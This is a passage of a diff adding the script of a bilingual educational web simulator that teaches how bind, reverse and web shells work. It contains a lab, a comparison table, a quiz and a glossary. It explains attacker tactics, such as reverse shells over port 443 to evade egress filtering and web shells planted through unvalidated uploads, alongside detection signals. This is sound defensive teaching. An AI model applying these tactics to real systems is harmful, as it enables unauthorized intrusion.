+    h += '<div><h4>' + esc(t('¿Se establecerá la shell?', 'Will the shell be established?')) + '</h4><div class="mini" style="margin-top:6px"><button class="btn kali" data-g="yes">' + esc(t('Creo que sí', 'I think yes')) + '</button><button class="btn" data-g="no">' + esc(t('Creo que no', 'I think no')) + '</button></div><p class="fine" style="margin-top:6px">' + esc(t('Tu predicción: ', 'Your tally: ')) + tally.ok + '/' + tally.n + '</p></div>';
+    h += '<div><h4>' + esc(t('Escenarios para probar', 'Scenarios to try')) + '</h4><div style="display:flex;flex-direction:column;gap:4px;margin-top:6px">' + PRESETS.map((p, i) => '<button class="btn small" style="text-align:left;justify-content:flex-start" data-p="' + i + '">' + L(p[0]) + '</button>').join('') + '</div></div>';
+    $('#ctl', host).innerHTML = h;
+    $$('[data-sh]', host).forEach((b) => b.addEventListener('click', () => { cfg.shell = b.dataset.sh; busy++; res = null; draw(); }));
+    $$('select', $('#ctl', host)).forEach((s) => s.addEventListener('change', () => { const k = s.id.slice(4); cfg[k] = (k === 'port' || k === 'lport') ? Number(s.value) : s.value; busy++; res = null; clearMarks(); preview(); result(); }));
+    $$('input[type=checkbox]', $('#ctl', host)).forEach((s) => s.addEventListener('change', () => { cfg[s.id.slice(4)] = s.checked; busy++; res = null; clearMarks(); preview(); result(); }));
+    $$('[data-g]', host).forEach((b) => b.addEventListener('click', () => run(b.dataset.g)));
+    $$('[data-p]', host).forEach((b) => b.addEventListener('click', () => { cfg = Object.assign({}, LAB_DEFAULT, PRESETS[+b.dataset.p][1]); busy++; res = null; draw(); }));
+  }
+  const clearMarks = () => $$('.fld', host).forEach((f) => f.classList.remove('used', 'unused'));
+  function mark() { $$('.fld', host).forEach((f) => { const u = res.used.includes(f.dataset.f); f.classList.toggle('used', u); f.classList.toggle('unused', !u); }); }
+  function result() {
+    const r = $('#result', host);
+    if (!res) { r.innerHTML = '<h4>' + esc(t('Resultado', 'Outcome')) + '</h4><p class="fine" style="margin-top:6px">' + esc(t('Haz tu predicción para ejecutar el intento.', 'Make your prediction to run the attempt.')) + '</p>'; return; }
+    const correct = guess === (res.ok ? 'yes' : 'no');
+    r.innerHTML = '<h4>' + esc(t('Resultado', 'Outcome')) + '</h4><p class="verdict ' + (res.ok ? 'ok' : 'no') + '">' + (res.ok ? '✔ ' + esc(t('Shell establecida', 'Shell established')) : '✘ ' + esc(t('La shell no se establece', 'The shell is not established'))) + '</p>' +
+      '<p class="fine">' + (correct ? '✔ ' + esc(t('Tu predicción fue correcta.', 'Your prediction was right.')) : '✘ ' + esc(t('Tu predicción no coincidió.', 'Your prediction did not match.'))) + '</p>' +
+      '<ul class="checks" style="margin-top:8px">' + res.checks.map((c) => '<li class="' + c.st + '"><span class="ic">' + CHECK_ICON[c.st] + '</span><span>' + L(c.txt) + '</span></li>').join('') + '</ul>' +
+      '<p style="margin-top:10px"><b>' + esc(t('Atacante ve: ', 'Attacker sees: ')) + '</b>' + L(res.att) + '</p><p style="margin-top:6px"><b>' + esc(t('Defensor ve: ', 'Defender sees: ')) + '</b>' + L(res.vic) + '</p>' +
+      '<div class="callout ' + (res.ok ? 'warn' : 'ok') + '" style="margin-top:10px">' + L(res.tip) + '</div><p class="fine" style="margin-top:8px">' + esc(t('Los ajustes con barra verde participaron en el resultado; los atenuados no influyeron.', 'Settings with a green bar took part in the outcome; dimmed ones made no difference.')) + '</p>';
+  }
+  async function run(g) {
+    const id = ++busy;
+    if (window.innerWidth <= 960) { try { $('#labsc', host).scrollIntoView({ behavior: 'smooth', block: 'center' }); } catch (e) { /* ignore */ } }
+    guess = g; res = labRun(cfg);
+    tally.n++; if (g === (res.ok ? 'yes' : 'no')) tally.ok++;
+    const sc = labScenario(cfg, res), pre = mergeState(BASE_STATE(), sc.pre);
+    scene.set(pre); setRules(pre);
+    $('#result', host).innerHTML = '<h4>' + esc(t('Resultado', 'Outcome')) + '</h4><p class="fine" style="margin-top:6px">' + esc(t('Ejecutando el intento…', 'Running the attempt…')) + '</p>';
+    await scene.play(sc.anim);
+    if (id !== busy || !res) return;
+    const fin = mergeState(pre, sc.post); scene.set(fin); setRules(fin);
+    controls(); mark(); result();
+  }
+  function draw() { controls(); preview(); result(); }
+  draw();
+}
+
+/* ---------- Compare + quiz ---------- */
+const COMPARE_ROWS = [
+  [T('Quién escucha', 'Who listens'), T('El servidor (payload en LISTEN)', 'The server (payload in LISTEN)'), T('El atacante (Kali)', 'The attacker (Kali)'), T('IIS, que ya escucha en 443', 'IIS, which already listens on 443')],
+  [T('Quién inicia el TCP', 'Who starts the TCP'), T('El atacante', 'The attacker'), T('El servidor (connect hacia fuera)', 'The server (connect outward)'), T('El atacante, en cada petición', 'The attacker, on every request')],
+  [T('Primer SYN viaja', 'First SYN travels'), T('Internet → DMZ', 'Internet → DMZ'), T('DMZ → Internet', 'DMZ → Internet'), T('Internet → DMZ (puerto 443)', 'Internet → DMZ (port 443)')],
+  [T('Necesita permitido', 'Needs allowed'), T('Entrada al puerto elegido, en perímetro y host', 'Inbound to the chosen port, at perimeter and host'), T('Salida al puerto del listener y una IP del atacante alcanzable', 'Outbound to the listener’s port and a reachable attacker IP'), T('Nada nuevo: el 443 ya está publicado', 'Nothing new: 443 is already published')],
+  [T('Sesión', 'Session'), T('Persistente (un cmd.exe vivo)', 'Persistent (one live cmd.exe)'), T('Persistente (un cmd.exe vivo)', 'Persistent (one live cmd.exe)'), T('Sin estado: un proceso por petición', 'Stateless: one process per request')],
+  [T('Interactividad', 'Interactivity'), T('Alta', 'High'), T('Alta', 'High'), T('Limitada: no persisten cd ni variables', 'Limited: cd and variables do not persist')],
+  [T('Cómo falla', 'How it fails'), T('<i>timed out</i> (firewall) o <i>refused</i> (sin listener)', '<i>timed out</i> (firewall) or <i>refused</i> (no listener)'), T('Silencio en Kali (salida bloqueada) o <i>refused</i> en la víctima (sin listener)', 'Silence on Kali (egress blocked) or <i>refused</i> on the victim (no listener)'), T('Subida rechazada, o 404.3 si no se ejecutan scripts', 'Upload rejected, or 404.3 if scripts do not execute')],
+  [T('Huella de red', 'Network footprint'), T('Puerto nuevo en LISTEN y entrada anómala', 'New LISTEN port and anomalous inbound'), T('Conexión saliente inusual hacia una IP desconocida', 'Unusual outbound connection to an unknown IP'), T('HTTPS aparentemente normal', 'Apparently normal HTTPS')],
+  [T('Huella en el host', 'Host footprint'), T('payload.exe escucha; cmd.exe hijo', 'payload.exe listens; child cmd.exe'), T('payload.exe conecta; cmd.exe hijo', 'payload.exe connects; child cmd.exe'), T('.aspx nuevo; w3wp.exe → cmd.exe en cada petición', 'new .aspx; w3wp.exe → cmd.exe on every request')],
+  [T('Mejor defensa', 'Best defense'), T('Deny-by-default de entrada + firewall de host', 'Inbound deny-by-default + host firewall'), T('Filtrado de salida + proxy + EDR', 'Egress filtering + proxy + EDR'), T('Endurecer subidas + FIM + alerta w3wp → cmd', 'Harden uploads + FIM + w3wp → cmd alert')],
+];
+const QUIZ = [
+  { q: T('El servidor está en una DMZ: entrada sólo 443, salida libre. El atacante ya ejecuta código y quiere una sesión interactiva. ¿Qué encaja mejor?', 'The server is in a DMZ: inbound only 443, outbound open. The attacker already runs code and wants an interactive session. What fits best?'),
+    opts: [T('Bind shell en 4444', 'Bind shell on 4444'), T('Reverse shell', 'Reverse shell'), T('Ninguna es posible', 'None is possible')], ok: 1,
+    why: T('La entrada está cerrada pero la salida no: la reverse shell hace que el primer SYN salga de la DMZ.', 'Inbound is closed but outbound is not: the reverse shell makes the first SYN leave the DMZ.') },
+  { q: T('El servidor no tiene salida a Internet en absoluto y sólo publica 443. Hay una función de subida sin validar. ¿Qué vía sigue disponible?', 'The server has no Internet egress at all and publishes only 443. An upload feature is unvalidated. Which route is still available?'),
+    opts: [T('Reverse shell', 'Reverse shell'), T('Bind shell', 'Bind shell'), T('Web shell', 'Web shell')], ok: 2,
+    why: T('La web shell sólo usa el 443 entrante que ya existe: no necesita salida ni puertos nuevos.', 'The web shell only uses the inbound 443 that already exists: it needs no egress or new ports.') },
+  { q: T('Tu Kali está en una LAN doméstica (192.168.1.20) sin redirección de puertos. Pones LHOST=192.168.1.20 en una reverse shell. ¿Qué ocurre?', 'Your Kali is on a home LAN (192.168.1.20) with no port forwarding. You set LHOST=192.168.1.20 in a reverse shell. What happens?'),
+    opts: [T('Funciona: el servidor encuentra la IP.', 'It works: the server finds the IP.'), T('Falla: el servidor no puede enrutar hacia una IP privada de tu LAN.', 'It fails: the server cannot route to a private IP on your LAN.'), T('Funciona, pero más lento.', 'It works, only slower.')], ok: 1,
+    why: T('Las IP privadas (RFC 1918) no se enrutan por Internet. Necesitas una IP pública, una redirección de puertos o un VPS.', 'Private IPs (RFC 1918) are not routed across the Internet. You need a public IP, port forwarding or a VPS.') },
+  { q: T('Al conectar a una bind shell, Kali muestra “Connection refused”. ¿Qué te dice?', 'When connecting to a bind shell, Kali shows “Connection refused”. What does it tell you?'),
+    opts: [T('Un firewall descartó el paquete.', 'A firewall dropped the packet.'), T('El paquete llegó al host y nadie escuchaba en ese puerto (respondió RST).', 'The packet reached the host and nobody was listening on that port (it answered RST).'), T('El DNS falló.', 'DNS failed.')], ok: 1,
+    why: T('Un DROP produce silencio y “timed out”. “Refused” exige una respuesta RST: el camino de red está abierto.', 'A DROP produces silence and “timed out”. “Refused” requires an RST reply: the network path is open.') },
+  { q: T('En tu listener ves una conexión desde 198.51.100.10, pero el servidor es 10.0.0.20. ¿Por qué?', 'On your listener you see a connection from 198.51.100.10, but the server is 10.0.0.20. Why?'),
+    opts: [T('El payload falsificó la IP.', 'The payload spoofed the IP.'), T('El NAT del firewall reemplazó la IP de origen privada por su IP pública.', 'The firewall’s NAT replaced the private source IP with its public one.'), T('Es otra máquina.', 'It is another machine.')], ok: 1,
+    why: T('SNAT: la IP privada no se enruta en Internet. La real sólo se ve en los logs internos.', 'SNAT: the private IP is not routable on the Internet. The real one only shows in internal logs.') },
+  { q: T('Muchas reverse shells usan el puerto 443 en lugar del 4444. ¿Qué lección de defensa deja eso?', 'Many reverse shells use port 443 instead of 4444. What defensive lesson does that leave?'),
+    opts: [T('Filtrar sólo por puerto de salida no basta: 443 saliente puede ser cualquier cosa.', 'Filtering only by outbound port is not enough: outbound 443 can be anything.'), T('Hay que bloquear el 443.', 'You must block 443.'), T('443 es un puerto privilegiado en Windows.', '443 is a privileged port on Windows.')], ok: 0,
+    why: T('Hay que mirar destino, proceso y frecuencia (proxy, reputación, EDR), no sólo el número de puerto.', 'You have to look at destination, process and frequency (proxy, reputation, EDR), not just the port number.') },
+  { q: T('¿Qué detección tiene mayor fidelidad para una web shell en IIS?', 'Which detection has the highest fidelity for a web shell on IIS?'),
+    opts: [T('Un puerto nuevo en LISTEN.', 'A new LISTEN port.'), T('w3wp.exe lanzando cmd.exe o powershell.exe.', 'w3wp.exe launching cmd.exe or powershell.exe.'), T('Tráfico saliente por el 4444.', 'Outbound traffic on 4444.')], ok: 1,
+    why: T('Las otras señales no existen en una web shell. La relación padre→hijo w3wp.exe → intérprete es rara en aplicaciones normales.', 'The other signals do not exist for a web shell. The w3wp.exe → interpreter parent/child relation is rare in normal applications.') },
+];
+
+function viewCompare(host) {
+  host.innerHTML = '<div class="view"><section class="sec"><h2>' + esc(t('Comparar las tres', 'Compare the three')) + '</h2><p class="lead">' + esc(t('Una vez conectadas, bind y reverse son idénticas; lo que cambia es quién llama a quién. La web shell es otra cosa: usa el canal HTTP.', 'Once connected, bind and reverse are identical; what changes is who calls whom. The web shell is different: it uses the HTTP channel.')) + '</p>' +
+    '<div class="tbl-wrap"><table class="cmp"><thead><tr><th></th><th>Bind</th><th>Reverse</th><th>Web</th></tr></thead><tbody>' +
+    COMPARE_ROWS.map((r) => '<tr><th scope="row">' + L(r[0]) + '</th><td>' + L(r[1]) + '</td><td>' + L(r[2]) + '</td><td>' + L(r[3]) + '</td></tr>').join('') + '</tbody></table></div></section>' +
+    '<section class="sec"><h2>' + esc(t('Comprueba lo aprendido', 'Check what you learned')) + '</h2><div class="quiz" id="quiz"></div><p class="scorebar" id="qscore"></p></section></div>';
+  const ans = {};
+  const q = $('#quiz', host);
+  function draw() {
+    q.innerHTML = QUIZ.map((it, i) => {
+      const a = ans[i];
+      return '<div class="card qcard"><b>' + (i + 1) + '. ' + L(it.q) + '</b><div class="opts">' + it.opts.map((o2, n) => '<button class="opt' + (a !== undefined ? (n === it.ok ? ' right' : n === a ? ' wrong' : '') : '') + '" data-q="' + i + '" data-o="' + n + '"' + (a !== undefined ? ' disabled' : '') + '>' + L(o2) + '</button>').join('') + '</div>' +
+        (a !== undefined ? '<div class="fb"><b>' + (a === it.ok ? '✔ ' + t('Correcto.', 'Correct.') : '✘ ' + t('No exactamente.', 'Not quite.')) + '</b> ' + L(it.why) + '</div>' : '') + '</div>';
+    }).join('');
+    const n = Object.keys(ans).length, ok = QUIZ.filter((it, i) => ans[i] === it.ok).length;
+    $('#qscore', host).textContent = n ? t('Aciertos: ', 'Correct: ') + ok + '/' + QUIZ.length + (n === QUIZ.length ? t(' — ¡Completado!', ' — Done!') : '') : '';
+  }
+  q.addEventListener('click', (e) => { const b = e.target.closest('.opt'); if (b && !b.disabled) { ans[+b.dataset.q] = +b.dataset.o; draw(); } });
+  draw();
+}
+
+/* ---------- Glossary ---------- */
+const GLOSS = [
+  [T('Shell', 'Shell'), T('Intérprete de comandos (cmd.exe, bash). Lee instrucciones de su entrada estándar y escribe resultados en su salida.', 'Command interpreter (cmd.exe, bash). Reads instructions from its standard input and writes results to its output.')],
+  [T('Shell remota', 'Remote shell'), T('Una shell cuyos stdin/stdout/stderr están conectados a un socket de red en lugar de a un teclado y una pantalla.', 'A shell whose stdin/stdout/stderr are wired to a network socket instead of a keyboard and screen.')],
+  [T('Bind shell', 'Bind shell'), T('El objetivo escucha en un puerto y el atacante se conecta a él.', 'The target listens on a port and the attacker connects to it.')],
+  [T('Reverse shell', 'Reverse shell'), T('El atacante escucha y es el objetivo quien se conecta hacia él.', 'The attacker listens and the target connects back to them.')],
+  [T('Web shell', 'Web shell'), T('Script del lado del servidor, colocado en un sitio web, que ejecuta instrucciones recibidas por HTTP(S).', 'Server-side script planted on a website that runs instructions received over HTTP(S).')],
+  [T('Payload', 'Payload'), T('Programa o código que se ejecuta en el objetivo tras explotar una falla y que realiza la acción final (aquí, abrir la shell).', 'Program or code that runs on the target after a flaw is exploited and does the final action (here, opening the shell).')],
+  [T('RCE (ejecución remota de código)', 'RCE (remote code execution)'), T('Capacidad de hacer que el objetivo ejecute código elegido por el atacante. Es el requisito previo de una shell.', 'Ability to make the target run code chosen by the attacker. It is the prerequisite of a shell.')],
+  [T('Socket', 'Socket'), T('Extremo de una comunicación de red que un programa abre con el sistema operativo.', 'Endpoint of a network communication that a program opens with the operating system.')],
+  [T('LISTEN', 'LISTEN'), T('Estado de un socket TCP que espera conexiones entrantes en un puerto.', 'State of a TCP socket waiting for incoming connections on a port.')],
+  [T('Saludo de tres vías', 'Three-way handshake'), T('SYN, SYN-ACK, ACK: el intercambio con el que TCP establece una conexión.', 'SYN, SYN-ACK, ACK: the exchange TCP uses to establish a connection.')],
+  [T('RST vs DROP', 'RST vs DROP'), T('RST: el host rechaza activamente (“connection refused”). DROP: se descarta sin responder (“timed out”).', 'RST: the host actively rejects (“connection refused”). DROP: discarded without a reply (“timed out”).')],
+  [T('Puerto efímero', 'Ephemeral port'), T('Puerto de origen temporal que el sistema asigna a una conexión saliente (49152–65535 en Windows).', 'Temporary source port the system assigns to an outbound connection (49152–65535 on Windows).')],
+  [T('Firewall con estado', 'Stateful firewall'), T('Firewall que recuerda las conexiones que permitió y acepta automáticamente sus respuestas.', 'Firewall that remembers the connections it allowed and automatically accepts their replies.')],
+  [T('NAT / SNAT', 'NAT / SNAT'), T('Traducción de direcciones. SNAT sustituye la IP de origen privada por una pública al salir.', 'Address translation. SNAT replaces the private source IP with a public one on the way out.')],
+  [T('Egress filtering', 'Egress filtering'), T('Control del tráfico que sale de una red. Limita qué puede iniciar un servidor comprometido.', 'Control of traffic leaving a network. Limits what a compromised server can start.')],
+  [T('Handler mapping', 'Handler mapping'), T('Configuración de IIS que decide qué motor procesa cada extensión (por ejemplo, ASP.NET para .aspx).', 'IIS setting that decides which engine processes each extension (for example ASP.NET for .aspx).')],
+  [T('Identidad del pool de aplicaciones', 'App-pool identity'), T('Cuenta con la que corre w3wp.exe (aquí IIS APPPOOL\\DefaultAppPool). Todo lo que ejecute la shell la hereda.', 'Account w3wp.exe runs as (here IIS APPPOOL\\DefaultAppPool). Whatever the shell runs inherits it.')],
+  [T('Relación padre→hijo', 'Parent→child relation'), T('Qué proceso lanzó a cuál. w3wp.exe → cmd.exe es una señal clásica de compromiso web.', 'Which process launched which. w3wp.exe → cmd.exe is a classic web-compromise signal.')],
+  [T('Sysmon', 'Sysmon'), T('Herramienta de Microsoft que registra creación de procesos (evento 1), conexiones de red (3), archivos creados (11) y más.', 'Microsoft tool that logs process creation (event 1), network connections (3), file creation (11) and more.')],
+  [T('FIM', 'FIM'), T('Monitor de integridad de archivos: avisa cuando aparecen o cambian archivos en rutas vigiladas.', 'File-integrity monitoring: alerts when files appear or change in watched paths.')],
+];
+function viewGlossary(host) {
+  host.innerHTML = '<div class="view"><section class="sec"><h2>' + esc(t('Glosario', 'Glossary')) + '</h2><input class="glossq" id="gq" type="search" placeholder="' + esc(t('Buscar un término…', 'Search a term…')) + '" aria-label="' + esc(t('Buscar', 'Search')) + '"><dl class="gloss" id="gl"></dl></section></div>';
+  const draw = (f) => { $('#gl', host).innerHTML = GLOSS.filter((g) => (L(g[0]) + ' ' + L(g[1])).toLowerCase().includes(f)).map((g) => '<div><dt>' + L(g[0]) + '</dt><dd>' + L(g[1]) + '</dd></div>').join(''); };
+  $('#gq', host).addEventListener('input', (e) => draw(e.target.value.toLowerCase().trim()));
+  draw('');
+}
+
+/* ============ App shell: tabs, language, view switching ============ */
+const TABS = [['intro', T('Inicio', 'Start')], ['bind', T('Bind', 'Bind')], ['reverse', T('Reverse', 'Reverse')], ['web', T('Web', 'Web')], ['lab', T('Laboratorio', 'Lab')], ['compare', T('Comparar', 'Compare')], ['glossary', T('Glosario', 'Glossary')]];
+let current = 'intro', cleanup = null;
+
+function chrome() {
+  document.documentElement.lang = lang;
+  $('#nav').innerHTML = TABS.map(([k, n]) => '<button class="tab" role="tab" data-k="' + k + '" aria-selected="' + (k === current) + '">' + esc(L(n)) + '</button>').join('');
+  $('#tag').textContent = t('Cómo funcionan las bind, reverse y web shells', 'How bind, reverse and web shells work');
+  $('#langBtn').textContent = lang === 'es' ? 'EN' : 'ES';
+  $('#langBtn').setAttribute('aria-label', lang === 'es' ? 'Switch to English' : 'Cambiar a español');
+  $('#foot').textContent = t('Material educativo para el curso de Ciberdefensa Avanzada. Simulación sin conexiones reales; empresa, hosts y direcciones ficticios. Practica sólo en entornos autorizados.', 'Educational material for the Advanced Cyberdefense course. A simulation with no real connections; company, hosts and addresses are fictional. Practice only in authorized environments.');
+}
+function show(k) {
+  if (cleanup) { cleanup(); cleanup = null; }
+  current = k;
+  $$('.tab').forEach((b) => b.setAttribute('aria-selected', b.dataset.k === k));
+  const main = $('#main'); main.innerHTML = '<div id="v"></div>';
+  const host = $('#v');
+  if (STAGES[k]) { const m = mountStage(k, host); cleanup = m.destroy; }
+  else if (k === 'intro') viewIntro(host);
+  else if (k === 'lab') mountLab(host);
+  else if (k === 'compare') viewCompare(host);
+  else viewGlossary(host);
+}
+function initLang() {
+  let saved = null;
+  try { saved = localStorage.getItem('shells-lang'); } catch (e) { /* storage unavailable */ }
+  lang = saved === 'en' || saved === 'es' ? saved : ((navigator.language || 'es').toLowerCase().startsWith('es') ? 'es' : 'en');
+}
+function boot() {
+  initLang();
+  const h = (location.hash || '').slice(1);
+  if (TABS.some(([k]) => k === h)) current = h;
+  chrome();
+  $('#nav').addEventListener('click', (e) => { const b = e.target.closest('.tab'); if (b) { show(b.dataset.k); window.scrollTo(0, 0); } });
+  $('#langBtn').addEventListener('click', () => {
+    lang = lang === 'es' ? 'en' : 'es';
+    try { localStorage.setItem('shells-lang', lang); } catch (e) { /* ignore */ }
+    chrome(); show(current);
+  });
+  show(current);
+}
+boot();
+
+</script>
+</body></html>
